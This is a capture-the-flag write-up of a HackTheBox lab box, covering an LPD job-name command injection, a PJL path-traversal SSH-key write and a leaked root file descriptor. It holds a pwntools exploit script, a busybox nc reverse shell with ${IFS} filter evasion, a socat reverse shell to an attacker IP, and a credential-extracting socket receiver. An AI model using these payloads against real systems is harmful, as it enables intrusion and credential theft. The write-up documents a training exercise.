---
layout: post
title: "Paperwork"
date: 2026-07-12 00:00:00 -0700
categories: challenges
description: A leaked line-printer-daemon archive hides a shell-injectable job-name field behind protocol filtering the challenge quietly removed; RFC 1179 supplies the missing wire-protocol detail, a printer path-traversal write pivots to a local user, and a built-in "security" daemon leaks a root-opened file descriptor to whoever deliberately trips its own malice detector.
parent: HackTheBox - Season 11
grand_parent: Challenges
event: "htb-season-11"
published: false
publish_after: 2026-07-19   # 7-day author embargo — confirm actual release date
tags:
  - "HackTheBox"
  - "Linux"
  - "LPD"
  - "PJL"
  - "command-injection"
  - "path-traversal"
  - "scm-rights"
  - "ssh-authorized-keys"
  - "T1190"
  - "T1059.004"
  - "T1057"
  - "T1552.001"
  - "T1098.004"
  - "T1078.003"
---
# Paperwork

## Engagement Notes

Paperwork is a Linux box built around a fictional print-archiving service: a
legacy Line Printer Daemon (LPD) spooler on port 1515 and a companion PJL
(Printer Job Language) service reachable only from the loopback interface.
The site leaks the LPD daemon's own source code, but the leaked copy has its
real protocol filtering quietly stripped out compared to what's actually
running — which turns out to be the box's real friction point, not the
command injection itself. The eventual root escalation isn't a bug in the
traditional sense either: it abuses a "security" feature — a monitoring
daemon that hands a privileged file descriptor to whoever it catches
attacking it.

## Attack path

1. **Recon** → `paperwork.htb` has 22 (ssh), 80 (http), and 1515 (LPD) open.
2. **Port 80** → a maintenance banner names a "legacy spooler" on the print
   side, and a visible page link hands over the spooler's own source as a
   small zip archive.
3. **Source review** → the leaked `server.py`'s control-file parsing turns
   out to be missing the real distinction between a control file and a data
   file that RFC 1179 describes — which misleads early exploit attempts
   until the RFC itself is read.
4. **Foothold** → a crafted LPD control file abuses the unsanitized `J`
   (job name) field to break out of a shell string and spawn a reverse
   shell, then `socat` upgrades it to a full pty.
5. **Internal enumeration** → `archivist` runs a real (non-honeypot) PJL
   `jetdirect.py` service bound to `127.0.0.1:9100`; root runs
   `paperwork-daemon` and the box's own `CorpoSite` web app (the real
   backend behind port 80's nginx front end).
6. **Path traversal → user pivot** → recon against the PJL service reveals a
   `0:\..\` traversal in its file-write handler; a raw PJL session writes an
   attacker SSH key into `archivist`'s `authorized_keys`, pivoting from the
   LPD-shell account to `archivist`.
7. **Reading `paperwork-daemon`'s source** (readable as `archivist`) shows it
   opens `/etc/paperwork/admin_pins.conf` as root at startup, and hands that
   open file descriptor to whoever connects to its management Unix socket
   right after a "malicious activity" check on the printer's own command log
   comes back positive.
8. **FD-passing exploit** → the FSUPLOAD/FSDOWNLOAD commands already sent
   during the path-traversal write are themselves what the malice check
   looks for. Connecting to the socket after that receives the daemon's
   root-opened file descriptor via `SCM_RIGHTS`, leaking `ADMIN_PASSWORD`.
9. **Root** → SSH in with the recovered password → `root.txt`.

## Enumeration

```console
$ rustscan -a $target
...
Open 10.129.35.81:22
Open 10.129.35.81:80
Open 10.129.35.81:1515
[~] Starting Script(s)
[~] Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-11 12:36 -0700
...
PORT     STATE SERVICE       REASON
22/tcp   open  ssh           syn-ack ttl 63
80/tcp   open  http          syn-ack ttl 63
1515/tcp open  ifor-protocol syn-ack ttl 63
```

`gobuster` was pointed at port 80 next:

```console
$ gobuster dir -u http://$target -w $(wordlists_path)/seclists/Discovery/Web-Content/common.txt -x txt,js,html,php -t 10 --timeout=6s
...
Progress: 12077 / 23750 (50.85%)^C
```

It was cut short — a page banner had already made port 1515 look like the
more direct vector:

> Maintenance Advisory: Backend spooler PRN-ARCHIVE-01 management console is
> currently offline. Manual ingestion remains active via the legacy gateway.

A visible link on the same page, matching the "legacy gateway" wording,
hands over the spooler's own source:

```console
$ wget http://$target/download/archive -O artifacts/paperwork-archive-v1.02.zip
--2026-07-11 12:40:14--  http://paperwork.htb/download/archive
Resolving paperwork.htb (paperwork.htb)... 10.129.35.81
Connecting to paperwork.htb (paperwork.htb)|10.129.35.81|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1138 (1.1K) [application/zip]
Saving to: 'artifacts/paperwork-archive-v1.02.zip'

2026-07-11 12:40:15 (271 MB/s) - 'artifacts/paperwork-archive-v1.02.zip' saved [1138/1138]
```

The archive unzips to a single file: `server.py`, the LPD daemon's own
source.

## Foothold — LPD control-file command injection

The queue name the exploit needs (`archive_intake`) was read straight off
the web page, not recovered from the archive.

A first pass at reconstructing the exploit from the leaked `server.py`
stalled for a long time: the archive's copy of `handle_print_job` doesn't
distinguish between the two sub-commands the real LPD job protocol uses (a
"receive control file" step and a separate "receive data file" step) — every
chunk is treated the same way. That distinction isn't a guess; it's exactly
what [RFC 1179](https://www.rfc-editor.org/rfc/rfc1179), the Line Printer
Daemon Protocol, defines in its printer-protocol and sub-command sections —
command `02` ("Receive a printer job") is itself followed by a second layer
of commands, where sub-command `02` receives the *control file* and
sub-command `03` receives the *data file*, each framed as
`<code><byte-count> <name>\n`. Once that split is understood from the RFC
rather than from the leaked source, a working exploit follows directly.

The control file's `J` line sets the print job's banner-page job name — RFC
1179 §7.4 defines it plainly: *"This command sets the job name to be printed
on the banner page."* On the real, running service (confirmed after landing
a shell — see below), that job name is parsed out of the control file and
interpolated, unsanitized, straight into a shell command:

```python
def handle_print_job(self, data):
    queue = data[1:].decode().strip()
    if queue not in VALID_QUEUE:
        ...
    self.sock.send(b'\x00')

    while True:
        chunk = self.sock.recv(1024)
        ...
        subcommand = chunk[0]
        self.sock.send(b'\x00')

        if subcommand == 2: # Control File
            parts = chunk[1:].decode(errors='ignore').split()
            size = int(parts[0])
            content = b""
            while len(content) < size:
                content += self.sock.recv(size - len(content) + 1)
            decoded_content = content.decode(errors='ignore')

            job_name = "Unknown"
            for line in decoded_content.split('\n'):
                line = line.strip()
                if line.startswith('J'):
                    job_name = line[1:]
                    break

            subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
```

`job_name` lands directly inside a `shell=True` `Popen` call. A control
file whose `J` line reads `J';busybox nc ...;'#` breaks out of the quoted
`echo` argument and runs whatever follows before the trailing `'#` comments
out the rest of the line:

```python
from pwn import *

command_code = b"\x02"
LPD_QUEUE = b"archive_intake\n"

enter_string = command_code + LPD_QUEUE
buffer_enter_string = enter_string + b' ' * (1024 - len(enter_string))

shell = b'busybox${IFS}nc${IFS}10.10.17.14${IFS}9998${IFS}-e${IFS}/bin/sh'
job_name_and_escape = b"J';"
job_name_termination = b";'#"
payload = job_name_and_escape + shell + job_name_termination

size = str(len(payload)).encode()
parts = b'\x02' + size
buffer_parts = parts + b' ' * (1024 - len(parts))

remote = remote('paperwork.htb', 1515)
remote.send(buffer_enter_string)   # 1024-byte buffered command string
remote.send(buffer_parts)          # 1024-byte buffered length of payload
print(remote.recvuntil(b'\x00'))   # ack
remote.send(payload)
print(remote.recvuntil(b'\x00\x00'))
```

```console
[x] Opening connection to paperwork.htb on port 1515
[+] Opening connection to paperwork.htb on port 1515: Done
b'\x02archive_intake\n                    ...[buffer padded to 1024 bytes with spaces]...'
b'\x00'
b'\x00\x00'
```

`${IFS}` stands in for spaces throughout the payload — plain spaces broke
the injection, so the shell's field-separator variable is used to smuggle
whitespace past whatever was filtering it. The reverse shell lands on port
9998; `socat` was used afterward, from inside that shell, to upgrade it to a
full interactive pty:

```
Target:   socat TCP:10.10.17.14:9997 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane
Attacker: socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:9997
```

> 🧠 The archive's `server.py` wasn't a faithful copy of the real service —
> its sub-command filtering had been removed, which misdirected the first
> round of payload attempts. Reading RFC 1179 to understand the actual
> control-file/data-file split — rather than continuing to reverse-engineer
> the (misleading) leaked source — was what unblocked the exploit. Even in
> an emulated engagement, understanding the raw protocol reduces friction
> and frustration far more reliably than reproducing a source dump that may
> not match what's actually deployed.

## Internal recon — a real PJL service and a root-owned "security" daemon

The relevant lines from the box's process list — each spotted separately while
enumerating — identify the services behind the two closed doors from the initial
scan:

```
archivi+     990       1  0 02:27 ?        00:00:00 /usr/bin/python3 /home/archivist/printer/jetdirect.py 9100 /home/archivist/printer/ /home/archivist/printer/logs/commands.log
root        1472       1  0 02:27 ?        00:00:00 /usr/bin/python3 /usr/bin/paperwork-daemon
root         974       1  0 02:27 ?        00:00:02 /usr/bin/python3 /root/staging/CorpoSite/app.py
```

`ss` confirms the PJL service is loopback-only, and also identifies
`CorpoSite` — the actual application behind the port-80 nginx front end
already interacted with during recon, not a separate avenue:

```
Netid State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess
tcp   LISTEN 0      100          0.0.0.0:1515      0.0.0.0:*  # LPDserver.py
tcp   LISTEN 0      100        127.0.0.1:9100      0.0.0.0:*  # jetdirect.py
tcp   LISTEN 0      128        127.0.0.1:1337      0.0.0.0:*  # corposite
tcp   LISTEN 0      511          0.0.0.0:80        0.0.0.0:*  # nginx router
tcp   LISTEN 0      4096         0.0.0.0:22        0.0.0.0:*  # ssh
```

The running `jetdirect.py` looked "eerily familiar" against
[`michaelneu/pjl-honeypot`](https://github.com/michaelneu/pjl-honeypot), a
public PJL/JetDirect honeypot built for a university malware-analysis
course — its `jetdirect.py` implements the same `@PJL` command-dictionary
shape (`FSDIRLIST`, `FSQUERY`, `INFO`, …). It ultimately turned out to be a
customized variant rather than the honeypot itself: the on-box version
implements real filesystem reads and writes behind those commands, not the
honeypot's fake in-memory filesystem.

> 🧠 The compromised account (believed to be `archivist` — the notebook has
> no explicit `whoami`/`id` after the LPD foothold, but `archivist` owns the
> printer directory and its group has access to the daemon's management
> socket used later) had read access to both service's source, which is how
> both were confirmed directly rather than inferred from process names
> alone.

## Path traversal → user pivot

The PJL service on `127.0.0.1:9100` isn't reachable directly from outside —
getting to it needed a relay from the shell already on the box. The exact
relay mechanism isn't captured in the notebook; what is on record is that
the box itself was unstable on the first attempt at this stage, and
noticeably more cooperative with network manipulation on a return visit the
next day.

[PRET](https://github.com/RUB-NDS/PRET) (Printer Exploitation Toolkit) was
pointed at the relayed PJL service; its debug output is what revealed the
underlying file-write primitive and its `0:\..\` traversal, by showing how
`FSDOWNLOAD`/`FSUPLOAD`/`FSDIRLIST` map onto a `Filesystem` class whose path
translation never rejects `..`:

```python
class Filesystem:
    def __init__(self, root_dir):
        self._root = os.path.abspath(root_dir)

    def _translate(self, path):
        clean = path.replace("0:", "").replace("\\", "/").lstrip("/")
        return os.path.normpath(os.path.join(self._root, clean))

    def write(self, path, data):
        target = self._translate(path)
        try:
            os.makedirs(os.path.dirname(target), exist_ok=True)
            with open(target, "wb") as f: f.write(data)
            return "OK"
        except: return "FILEERROR=1"
```

`_translate` joins the client-supplied path onto the printer's file root
with `os.path.join` and normalizes it — `os.path.normpath` collapses `..`
segments rather than rejecting them, so a name like `0:\..\.ssh\authorized_keys`
resolves outside the intended directory. This is
[CWE-22](https://cwe.mitre.org/data/definitions/22.html), Improper
Limitation of a Pathname to a Restricted Directory.

Turning that primitive into a write meant going around PRET and sending raw
PJL ASCII directly over the wire:

```console
 nc paperwork.htb 8080
@PJL FSUPLOAD NAME="0:\jetdirect.py"
@PJL FSUPLOAD NAME="0:\jetdirect.py" SIZE=5119
#!/usr/bin/env python3
...[jetdirect.py source echoed back, elided]...

 nc paperwork.htb 8080
@PJL FSDOWNLOAD NAME="0:\..\.ssh\authorized_keys" SIZE=80
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPESRjLOTlA4khvvXIFPecOJbIZ2sKWbsgLvfnThhkAx
OK
```

(`FSDOWNLOAD` is named from the printer's perspective — it *receives* data
from the client and writes it server-side.) The write traverses out of the
printer's file root and appends an attacker public key to `archivist`'s
`authorized_keys`, pivoting from whichever low-privileged account the LPD
shell landed as over to `archivist` directly via SSH with the matching
private key.

> 🧠 This write was the actual lateral-movement step in the chain, not a
> proof-of-concept left unused — the resulting `archivist` access is what
> reads `paperwork-daemon`'s source and reaches its management socket in the
> next stage.

## Privilege escalation — a "security" daemon's own evidence handoff

As `archivist`, `/usr/bin/paperwork-daemon`'s source is directly readable.
It opens a credentials file as root once, at startup, and keeps that
descriptor open for the life of the process:

```python
try:
    admin_fd = os.open("/etc/paperwork/admin_pins.conf", os.O_RDONLY)
except Exception:
    os._exit(1)

LOG_PATH = "/home/archivist/printer/logs/commands.log"

def get_admin_secret():
    data = os.pread(admin_fd, 1024, 0).decode().strip()
    if "ADMIN_PASSWORD=" in data:
        return data.split("ADMIN_PASSWORD=")[1].split("\n")[0]
    return data

def scan_for_malice():
    if not os.path.exists(LOG_PATH):
        return False
    with open(LOG_PATH, 'r') as f:
        content = f.read().upper()
        if any(trigger in content for trigger in ["FSQUERY", "FSUPLOAD", "FSDOWNLOAD"]):
            return True
    return False

def trigger_lockdown(conn):
    try:
        log_fd = os.open(LOG_PATH, os.O_RDONLY)
        evidence_bundle = array.array("i", [log_fd, admin_fd])
        msg = b"ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED."
        conn.sendmsg([msg], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle)])
        ...
```

```python
    while True:
        conn, _ = s.accept()
        if scan_for_malice():
            trigger_lockdown(conn)
        else:
            secret = get_admin_secret()
            token = hashlib.sha256(f"SYSTEM_CLEAN:{secret}".encode()).hexdigest()
            conn.sendall(f"STATUS: SYSTEM_CLEAN\nSIGNATURE: {token}\n".encode())
        conn.close()
```

`LOG_PATH` is the same `commands.log` that the real `jetdirect.py` writes
every raw PJL command line to. The `FSUPLOAD`/`FSDOWNLOAD` commands already
sent while writing the SSH key are, themselves, exactly what
`scan_for_malice()` looks for — so the next connection to the daemon's
management socket (`/run/paperwork/mgmt.sock`) triggers `trigger_lockdown()`,
which hands that connection the daemon's own root-opened file descriptors
(`log_fd` and `admin_fd`) as `SCM_RIGHTS` ancillary data. Per
[`unix(7)`](https://man7.org/linux/man-pages/man7/unix.7.html), `SCM_RIGHTS`
is "equivalent to duplicating a file descriptor into the file descriptor
table of another process" — the receiving process gets access to the
already-open file regardless of its own filesystem permissions on that path.

A receiver script connects to the socket and reads the second descriptor in
the bundle — `admin_fd`, per the `[log_fd, admin_fd]` order in the daemon's
own source:

```python
SOCKET_PATH = "/run/paperwork/mgmt.sock"

def run_receiver():
    client_sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    try:
        client_sock.connect(SOCKET_PATH)
        ...
        max_fds = 3  # Maximum number of FDs expected in the bundle
        fd_size = array.array("i").itemsize
        ancbufsize = socket.CMSG_LEN(max_fds * fd_size)

        msg, ancdata, flags, addr = client_sock.recvmsg(1024, ancbufsize)
        ...
        fds = []
        for cmsg_level, cmsg_type, cmsg_data in ancdata:
            if cmsg_level == socket.SOL_SOCKET and cmsg_type == socket.SCM_RIGHTS:
                received_fds = array.array("i")
                byte_len = len(cmsg_data) - (
                    len(cmsg_data) % received_fds.itemsize
                )
                received_fds.frombytes(cmsg_data[:byte_len])
                fds.extend(received_fds)

        if len(fds) > 1:
            target_fd = fds[1]
            ...
            with os.fdopen(target_fd, "r") as f:
                ...
                print(f.read())
```

```console
--- Content of evidence_bundle[1] ---
ADMIN_PASSWORD=ApparelMortuary…
---------------------------------------
```

```console
$ ssh root@10.129.35.95
...
Last login: Tue Jul  7 13:54:13 UTC 2026 from 10.10.14.84 on ssh
Welcome to Ubuntu 25.10 (GNU/Linux 6.17.0-40-generic x86_64)
root@paperwork:~# cat /root/root.txt
176f1452…b0f8
```

> 🧠 The `fds[1]` index wasn't trial and error — it comes straight from the
> daemon's own `evidence_bundle = array.array("i", [log_fd, admin_fd])`
> line: index 0 is the log, index 1 is the admin secret. The "aha" was
> mundane once the source was in hand: a monitoring feature meant to hand
> incident responders forensic context doesn't check *who* is on the other
> end of the socket it's handing that context to — tripping its own
> detector and being the one connected when it fires is enough.

## What didn't work

- **`gobuster` against port 80** was cut off partway through
  (`Progress: 12077 / 23750 (50.85%)^C`) once the page's spooler banner made
  port 1515 look like the more direct vector. In hindsight, letting both
  run to completion in parallel would have been the safer default rather
  than abandoning one entirely on a hunch.
- **Payloads built directly against the archive's `server.py`** stalled for
  a long time. The leaked copy's `handle_print_job` has no distinction
  between the LPD protocol's control-file and data-file sub-commands — a
  distinction the challenge author appears to have deliberately removed
  compared to the real, running service. No amount of iterating on that
  source got the framing right; reading RFC 1179 directly did.

## Tools used

| Tool | Role on this box | Reference |
|---|---|---|
| rustscan | Initial port scan | [github.com/RustScan/RustScan](https://github.com/RustScan/RustScan) |
| gobuster | Web content discovery on port 80 (abandoned once port 1515 looked more promising) | [github.com/OJ/gobuster](https://github.com/OJ/gobuster) |
| wget | Downloaded the leaked spooler archive | — |
| pwn (pwntools) | Crafted the LPD control-file injection and the `mgmt.sock` `SCM_RIGHTS` receiver | [github.com/Gallopsled/pwntools](https://github.com/Gallopsled/pwntools) |
| busybox nc | Reverse-shell payload, and the raw PJL sessions used for the `FSUPLOAD`/`FSDOWNLOAD` traversal write | — |
| socat | Upgraded the initial reverse shell to a full pty | [linux.die.net/man/1/socat](https://linux.die.net/man/1/socat) |
| PRET | Debug-output recon against the relayed PJL service; revealed the `0:\..\` traversal primitive (named by the operator during interview; not captured directly in a notebook cell) | [github.com/RUB-NDS/PRET](https://github.com/RUB-NDS/PRET) |
| ssh | Final root login with the recovered password | — |

## Tactics (MITRE ATT&CK)

Only techniques whose definition matches what happened, each verified
against its ATT&CK page:

| Technique | ID | Where |
|---|---|---|
| Exploit Public-Facing Application | [T1190](https://attack.mitre.org/techniques/T1190/) | Unauthenticated command injection in the LPD job-name field on public port 1515 |
| Command and Scripting Interpreter: Unix Shell | [T1059.004](https://attack.mitre.org/techniques/T1059/004/) | `busybox nc ... -e /bin/sh` spawned via the shell injection |
| Process Discovery | [T1057](https://attack.mitre.org/techniques/T1057/) | Process listings identifying `jetdirect.py` (archivist), `paperwork-daemon` and `CorpoSite` (root) |
| Unsecured Credentials: Credentials In Files | [T1552.001](https://attack.mitre.org/techniques/T1552/001/) | `ADMIN_PASSWORD` stored in `/etc/paperwork/admin_pins.conf`, exposed via the leaked file descriptor |
| Account Manipulation: SSH Authorized Keys | [T1098.004](https://attack.mitre.org/techniques/T1098/004/) | Attacker public key written into `archivist`'s `authorized_keys` via the path-traversal write |
| Valid Accounts: Local Accounts | [T1078.003](https://attack.mitre.org/techniques/T1078/003/) | Root SSH login using the password recovered from `admin_pins.conf` |

> **Not tagged, and why:** the `0:\..\` path traversal in the PJL
> `FSDOWNLOAD` handler is [CWE-22](https://cwe.mitre.org/data/definitions/22.html)
> (Improper Limitation of a Pathname to a Restricted Directory) but has no
> matching ATT&CK technique of its own — it's described in prose and cited
> to CWE instead of forced into a tag. The `SCM_RIGHTS` file-descriptor
> handoff itself is a Unix IPC primitive (documented in
> [`unix(7)`](https://man7.org/linux/man-pages/man7/unix.7.html)), not a
> catalogued adversary technique; the credential it exposes is what's
> tagged, under T1552.001. **T1021.004 Remote Services: SSH** was also
> considered for the `archivist` pivot, but T1098.004's own definition
> already covers logging in with a planted key ("an adversary possessing
> the corresponding private key may log in as an existing user via SSH") —
> a second tag would double-count the same step.

## Lessons

- **Understanding a protocol from its specification beats reverse-engineering
  it from a source dump that might not match reality.** The leaked
  `server.py` had its real sub-command filtering removed; no amount of
  local iteration against that copy would have surfaced the actual framing.
  RFC 1179 did, directly. Even in an emulated engagement, understanding the
  raw protocol reduces friction and frustration.
- **A "security" feature is still attack surface.** `paperwork-daemon`'s
  incident-response handoff was built to give a human responder forensic
  context — it never questioned who was on the other end of the socket
  receiving that context. Deliberately tripping the detector was the
  exploit.
- **Read the source before automating around it.** PRET's tooling got close
  to the traversal, but confirming and using it meant reading the actual
  `Filesystem._translate()` implementation and sending raw protocol bytes
  by hand.

## Further reading

**Used during the engagement:**
- [rustscan](https://github.com/RustScan/RustScan)
- [gobuster](https://github.com/OJ/gobuster)
- [pwn (pwntools)](https://github.com/Gallopsled/pwntools)
- [socat](https://linux.die.net/man/1/socat)

**Also relied on (named by the operator during interview; not captured
directly in a notebook cell):**
- [PRET — Printer Exploitation Toolkit](https://github.com/RUB-NDS/PRET)
- [RFC 1179 — Line Printer Daemon Protocol](https://www.rfc-editor.org/rfc/rfc1179) — read directly to understand the real control-file/data-file framing after the leaked `server.py` misled early payload attempts

**Reference material (added for study, not consulted during the solve):**
- [michaelneu/pjl-honeypot](https://github.com/michaelneu/pjl-honeypot) — the public PJL/JetDirect honeypot the on-box `jetdirect.py` resembled (but was not; the box runs a customized variant with real filesystem access)
- [CWE-22 — Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
- [CWE-78 — OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [unix(7) — SCM_RIGHTS](https://man7.org/linux/man-pages/man7/unix.7.html)

---

*Provenance: commands, outputs, credentials, and flags are transcribed from
the engagement notebook (credential material partially redacted). External
facts (RFC 1179, CWE-22, CWE-78, the `unix(7)` `SCM_RIGHTS` semantics, and
the MITRE ATT&CK technique definitions) are linked to their source and were
fetched, not recalled.*
